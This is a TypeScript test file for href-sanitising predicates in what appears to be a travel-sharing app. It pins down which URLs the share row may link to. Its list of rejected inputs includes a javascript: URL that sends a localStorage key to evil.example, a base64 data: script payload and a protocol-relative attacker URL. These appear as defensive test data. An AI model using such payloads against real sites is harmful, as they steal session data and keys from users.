// The two href predicates, pinned against each other.
//
// `components/share-inbox.tsx` carried its own inline copy of the http-only rule, which is how the
// two drifted apart in the first place. The copy is gone and the share row now imports
// `isHttpHref`, so what needs holding is the SHAPE of the pair: `isHttpHref` accepts http(s) and
// nothing else, and stays a strict subset of `isSafeHref`.
//
// `javascript:` and `data:` are asserted even though no version of either predicate has ever
// accepted them. They are the cases that a future widening breaks silently: the export is static
// GitHub Pages with no CSP, so one of those in an `<a href>` runs on the app origin with the
// Firebase session and every trip key in localStorage in reach (D-407).

import { describe, it, expect } from 'vitest';
import { isHttpHref, isSafeHref } from '@/lib/safe-href';

const ACCEPTED = [
  'https://maps.app.goo.gl/abc',
  'http://example.com/page?q=1#frag',
  'HTTPS://EXAMPLE.COM',
  'https://example.com',
];

const REJECTED = [
  'mailto:someone@example.com',
  "javascript:fetch('https://evil.example/?'+localStorage.getItem('nepal_japan_itinerary'))",
  'JavaScript:alert(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  '#top',
  '#',
  '/share',
  '//evil.example/path',
  'ftp://example.com/file',
  ' https://example.com',
  'https:/example.com',
  '',
];

describe('isHttpHref — the share-target rule', () => {
  it('accepts http and https, whatever the case', () => {
    for (const url of ACCEPTED) expect(isHttpHref(url), url).toBe(true);
  });

  it('rejects mailto:, javascript:, data:, fragment-only and every other scheme', () => {
    for (const url of REJECTED) expect(isHttpHref(url), url).toBe(false);
  });

  it('is TOTAL — a non-string is false, never a throw', () => {
    for (const v of [undefined, null, 42, {}, [], { toString: () => 'https://example.com' }]) {
      expect(isHttpHref(v)).toBe(false);
    }
  });
});

describe('isHttpHref vs isSafeHref', () => {
  it('is a STRICT subset — anything http-safe is href-safe, and the reverse does not hold', () => {
    for (const url of [...ACCEPTED, ...REJECTED]) {
      if (isHttpHref(url)) expect(isSafeHref(url), url).toBe(true);
    }
    // The gap is exactly what the share row must keep out. `//evil.example` is the sharp one: it
    // is protocol-relative, so it passes the leading-`/` arm and then navigates to another host.
    for (const url of ['mailto:someone@example.com', '#top', '/share', '//evil.example/path']) {
      expect(isSafeHref(url), url).toBe(true);
      expect(isHttpHref(url), url).toBe(false);
    }
  });

  it('neither predicate accepts javascript: or data:', () => {
    for (const url of ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>']) {
      expect(isSafeHref(url), url).toBe(false);
      expect(isHttpHref(url), url).toBe(false);
    }
  });
});
